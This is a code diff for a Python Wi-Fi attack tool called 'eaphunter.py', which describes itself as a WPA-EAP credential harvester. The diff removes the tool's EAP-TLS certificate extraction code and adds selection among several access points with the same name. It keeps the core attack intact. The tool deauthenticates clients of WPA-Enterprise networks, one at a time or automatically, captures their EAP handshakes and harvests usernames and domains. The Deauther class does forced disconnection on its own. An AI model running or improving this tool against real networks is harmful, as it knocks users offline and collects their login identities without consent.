@@ -3,16 +3,14 @@
 eaphunter.py  —  WPA-EAP Credential Harvester
 
 Continuously monitors clients on a WPA-Enterprise AP. Select a client
-to deauthenticate, capture the EAP handshake, extract the server
-certificate, and harvest the outer identity (username / domain).
-Returns to monitoring after each attack.
+to deauthenticate, capture the EAP handshake, and harvest the outer
+identity (username / domain). Returns to monitoring after each attack.
 
 Usage:  sudo python3 eaphunter.py -e <ESSID> -i <interface> [-o <dir>]
-Deps:   iw  ip  (system)   scapy  cryptography  (pip)
+Deps:   iw  ip  (system)   scapy  (pip)
 """
 
 import argparse
-import hashlib
 import os
 import re
 import select as _select
@@ -604,100 +602,6 @@ def _vendor(mac: str) -> str:
     return "UNKNOWN"
 
 
-# ── TLS certificate extraction from raw EAP payload bytes ────────────────────
-def _parse_tls_cert_chain(data: bytes) -> list[bytes]:
-    certs, off = [], 0
-    while off + 5 <= len(data):
-        ctype   = data[off]
-        rec_len = int.from_bytes(data[off + 3: off + 5], "big")
-        off += 5
-        if off + rec_len > len(data):
-            break
-        rec = data[off: off + rec_len]
-        off += rec_len
-        if ctype != 22:
-            continue
-        hs = 0
-        while hs + 4 <= len(rec):
-            hs_type = rec[hs]
-            hs_len  = int.from_bytes(rec[hs + 1: hs + 4], "big")
-            hs += 4
-            if hs + hs_len > len(rec):
-                break
-            body = rec[hs: hs + hs_len]
-            hs  += hs_len
-            if hs_type != 11 or len(body) < 3:
-                continue
-            list_len = int.from_bytes(body[0:3], "big")
-            c = 3
-            while c + 3 <= 3 + list_len and c + 3 <= len(body):
-                c_len = int.from_bytes(body[c: c + 3], "big")
-                c += 3
-                if c + c_len > len(body):
-                    break
-                if c_len:
-                    certs.append(body[c: c + c_len])
-                c += c_len
-    return certs
-
-
-def _certs_from_pcap(pcap_file: str) -> list[tuple[bytes, str, str]]:
-    pkts = _sc.rdpcap(pcap_file)
-    frags: dict[int, bytes] = {}
-    results, seen = [], set()
-    for pkt in pkts:
-        if not pkt.haslayer(_sc.EAP):
-            continue
-        eap = pkt[_sc.EAP]
-        if eap.code != 1 or eap.type not in (13, 21, 25):
-            continue
-        src = pkt[_sc.Dot11].addr2 if pkt.haslayer(_sc.Dot11) else "?"
-        dst = pkt[_sc.Dot11].addr1 if pkt.haslayer(_sc.Dot11) else "?"
-        try:
-            raw = bytes(eap.payload)
-        except Exception:
-            continue
-        if not raw:
-            continue
-        flags    = raw[0]
-        has_len  = bool(flags & 0x80)
-        more     = bool(flags & 0x40)
-        tls_data = raw[1 + (4 if has_len else 0):]
-        eid      = eap.id
-        frags[eid] = frags.get(eid, b"") + tls_data
-        if not more:
-            for cert_der in _parse_tls_cert_chain(frags.pop(eid)):
-                fp = hashlib.md5(cert_der).hexdigest()
-                if fp not in seen:
-                    seen.add(fp)
-                    results.append((cert_der, src, dst))
-    return results
-
-
-# ── Certificate display (cryptography) ───────────────────────────────────────
-def _display_cert(cert_der: bytes):
-    try:
-        from cryptography import x509
-        from cryptography.hazmat.backends import default_backend
-        from cryptography.hazmat.primitives import hashes
-        cert = x509.load_der_x509_certificate(cert_der, default_backend())
-        print(f"  Subject    : {cert.subject.rfc4514_string()}")
-        print(f"  Issuer     : {cert.issuer.rfc4514_string()}")
-        print(f"  Not Before : {cert.not_valid_before}")
-        print(f"  Not After  : {cert.not_valid_after}")
-        fp = cert.fingerprint(hashes.SHA256()).hex()
-        print(f"  SHA-256    : {':'.join(fp[i:i+2] for i in range(0, len(fp), 2))}")
-        try:
-            san = cert.extensions.get_extension_for_class(x509.SubjectAlternativeName)
-            for dns in san.value.get_values_for_type(x509.DNSName):
-                print(f"  SAN        : {dns}")
-        except Exception:
-            pass
-    except ImportError:
-        warn("cryptography not available — DER/PEM saved but details not shown")
-    except Exception as e:
-        warn(f"Cert parse error: {e}")
-
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 class EAPHunter:
@@ -795,13 +699,17 @@ class EAPHunter:
 
     def _discover_ap(self):
         section("AP Discovery")
-        found, current = {}, {"ch": 1}
+        candidates: dict[str, dict] = {}
+        current = {"ch": 1}
         stop_hop = threading.Event()
+        candidates_lock = threading.Lock()
 
         def handle(pkt):
             if not (pkt.haslayer(_sc.Dot11Beacon) or pkt.haslayer(_sc.Dot11ProbeResp)):
                 return
             bssid = pkt[_sc.Dot11].addr3 or pkt[_sc.Dot11].addr2
+            if not bssid:
+                return
             essid_bytes, ds_ch = b"", 0
             elt = pkt[_sc.Dot11Elt] if pkt.haslayer(_sc.Dot11Elt) else None
             while isinstance(elt, _sc.Dot11Elt):
@@ -814,24 +722,44 @@ class EAPHunter:
                 essid = essid_bytes.decode(errors="replace")
             except Exception:
                 return
-            if essid == self.essid and not found:
-                found["bssid"]   = bssid
-                found["channel"] = ds_ch or current["ch"]
+            if essid == self.essid:
+                with candidates_lock:
+                    if bssid.lower() not in candidates:
+                        candidates[bssid.lower()] = {
+                            "bssid":   bssid,
+                            "channel": ds_ch or current["ch"],
+                        }
 
         hop = threading.Thread(target=self._hop_channels, args=(stop_hop, current), daemon=True)
         hop.start()
-        info(f"Scanning for '{self.essid}' …")
-
-        _sc.sniff(iface=self.iface, prn=handle,
-                  stop_filter=lambda _: bool(found),
-                  timeout=60, store=False)
-
+        info(f"Scanning for '{self.essid}' (15s) …")
+        _sc.sniff(iface=self.iface, prn=handle, timeout=15, store=False)
         stop_hop.set()
-        if not found:
+
+        if not candidates:
             die(f"'{self.essid}' not found — AP out of range or SSID hidden.")
 
-        self.bssid   = found["bssid"]
-        self.channel = found["channel"]
+        entries = list(candidates.values())
+        if len(entries) == 1:
+            chosen = entries[0]
+        else:
+            print(f"\n  Found {len(entries)} BSS for '{self.essid}':\n")
+            for i, e in enumerate(entries, 1):
+                print(f"    [{i}]  {e['bssid']}  (ch {e['channel']})")
+            print()
+            while True:
+                sys.stdout.write("  Select BSSID [1]: ")
+                sys.stdout.flush()
+                raw = sys.stdin.readline().strip()
+                if not raw:
+                    raw = "1"
+                if raw.isdigit() and 1 <= int(raw) <= len(entries):
+                    chosen = entries[int(raw) - 1]
+                    break
+                warn(f"Enter 1-{len(entries)}.")
+
+        self.bssid   = chosen["bssid"]
+        self.channel = chosen["channel"]
         ok(f"SSID    : {self.essid}")
         ok(f"BSSID   : {self.bssid}")
         ok(f"Channel : {self.channel}")
@@ -894,7 +822,6 @@ class EAPHunter:
                         target = entry["mac"]
                         info(f"Auto deauth: {target}")
                         self._deauth_and_capture(target)
-                        self._extract_cert(self.active_pcap)
                         with self._client_lock:
                             if target in self._client_table:
                                 self._client_table[target]["deauthed"] = True
@@ -925,7 +852,6 @@ class EAPHunter:
 
                 # ── Deauth + capture ──────────────────────────────────────
                 self._deauth_and_capture(target)
-                self._extract_cert(self.active_pcap)
 
                 # Mark as deauthed
                 with self._client_lock:
@@ -1027,9 +953,8 @@ class EAPHunter:
         prompt = f"  [?] Select [1-{n_clients}], 'auto', or 'q': " if n_clients else \
                  "  [?] Waiting for clients … ('q' to quit): "
         print(prompt, end="", flush=True)
-        print()   # blank line after prompt so next output doesn't run into it
 
-        return len(rows) + 1   # +1 for the prompt+newline line
+        return len(rows) + 1   # +1 for the prompt line
 
     # ── Deauth + Capture (sniff starts BEFORE deauth is sent) ────────────────
 
@@ -1094,45 +1019,6 @@ class EAPHunter:
         if not seen_ids:
             warn("No live identities — parsing pcap …")
             self._pcap_identities(self.active_pcap)
-
-    # ── Certificate extraction ────────────────────────────────────────────────
-
-    def _extract_cert(self, pcap_file: str) -> bool:
-        section("EAP Certificate Extraction")
-        if not pcap_file or not Path(pcap_file).exists():
-            warn("No pcap available.")
-            return False
-
-        info(f"Parsing {Path(pcap_file).name} for EAP-TLS server certificate …")
-        cert_list = _certs_from_pcap(pcap_file)
-
-        if not cert_list:
-            warn("No EAP certificate found in this capture.")
-            return False
-
-        cert_der, src_mac, dst_mac = cert_list[0]
-
-        der_path = self.out_dir / "eap_server_cert.der"
-        pem_path = self.out_dir / "eap_server_cert.pem"
-        der_path.write_bytes(cert_der)
-
-        import base64
-        b64 = base64.b64encode(cert_der).decode()
-        pem_path.write_text(
-            "-----BEGIN CERTIFICATE-----\n"
-            + "\n".join(b64[i:i+64] for i in range(0, len(b64), 64))
-            + "\n-----END CERTIFICATE-----\n"
-        )
-
-        ok(f"AP {src_mac}  ->  Client {dst_mac}")
-        ok(f"Saved DER : {der_path}")
-        ok(f"Saved PEM : {pem_path}")
-        if len(cert_list) > 1:
-            info(f"Certificate chain depth: {len(cert_list)}")
-
-        print("\n  -- Certificate Details " + "-" * 40)
-        _display_cert(cert_der)
-        return True
 
     # ── Identity helpers ─────────────────────────────────────────────────────
 
@@ -1426,13 +1312,17 @@ class Deauther:
 
     def _discover_ap(self):
         section("AP Discovery")
-        found, current = {}, {"ch": 1}
+        candidates: dict[str, dict] = {}
+        current = {"ch": 1}
         stop_hop = threading.Event()
+        candidates_lock = threading.Lock()
 
         def handle(pkt):
             if not (pkt.haslayer(_sc.Dot11Beacon) or pkt.haslayer(_sc.Dot11ProbeResp)):
                 return
             bssid = pkt[_sc.Dot11].addr3 or pkt[_sc.Dot11].addr2
+            if not bssid:
+                return
             essid_bytes, ds_ch = b"", 0
             elt = pkt[_sc.Dot11Elt] if pkt.haslayer(_sc.Dot11Elt) else None
             while isinstance(elt, _sc.Dot11Elt):
@@ -1445,22 +1335,45 @@ class Deauther:
                 essid = essid_bytes.decode(errors="replace")
             except Exception:
                 return
-            if essid == self.essid and not found:
-                found["bssid"] = bssid
-                found["channel"] = ds_ch or current["ch"]
+            if essid == self.essid:
+                with candidates_lock:
+                    if bssid.lower() not in candidates:
+                        candidates[bssid.lower()] = {
+                            "bssid":   bssid,
+                            "channel": ds_ch or current["ch"],
+                        }
 
         hop = threading.Thread(target=self._hop_channels, args=(stop_hop, current),
                                daemon=True)
         hop.start()
-        info(f"Scanning for '{self.essid}' …")
-        _sc.sniff(iface=self.iface, prn=handle,
-                  stop_filter=lambda _: bool(found), timeout=60, store=False)
+        info(f"Scanning for '{self.essid}' (15s) …")
+        _sc.sniff(iface=self.iface, prn=handle, timeout=15, store=False)
         stop_hop.set()
 
-        if not found:
+        if not candidates:
             die(f"'{self.essid}' not found.")
-        self.bssid   = found["bssid"]
-        self.channel = found["channel"]
+
+        entries = list(candidates.values())
+        if len(entries) == 1:
+            chosen = entries[0]
+        else:
+            print(f"\n  Found {len(entries)} BSS for '{self.essid}':\n")
+            for i, e in enumerate(entries, 1):
+                print(f"    [{i}]  {e['bssid']}  (ch {e['channel']})")
+            print()
+            while True:
+                sys.stdout.write("  Select BSSID [1]: ")
+                sys.stdout.flush()
+                raw = sys.stdin.readline().strip()
+                if not raw:
+                    raw = "1"
+                if raw.isdigit() and 1 <= int(raw) <= len(entries):
+                    chosen = entries[int(raw) - 1]
+                    break
+                warn(f"Enter 1-{len(entries)}.")
+
+        self.bssid   = chosen["bssid"]
+        self.channel = chosen["channel"]
         ok(f"SSID    : {self.essid}")
         ok(f"BSSID   : {self.bssid}")
         ok(f"Channel : {self.channel}")
@@ -1541,7 +1454,6 @@ class Deauther:
         prompt = (f"  [?] Select [1-{n}], 'auto', or 'q': " if n
                   else "  [?] Waiting for clients … ('q' to quit): ")
         print(prompt, end="", flush=True)
-        print()   # blank line after prompt
         return len(rows) + 1
 
     # ── Deauth ───────────────────────────────────────────────────────────────
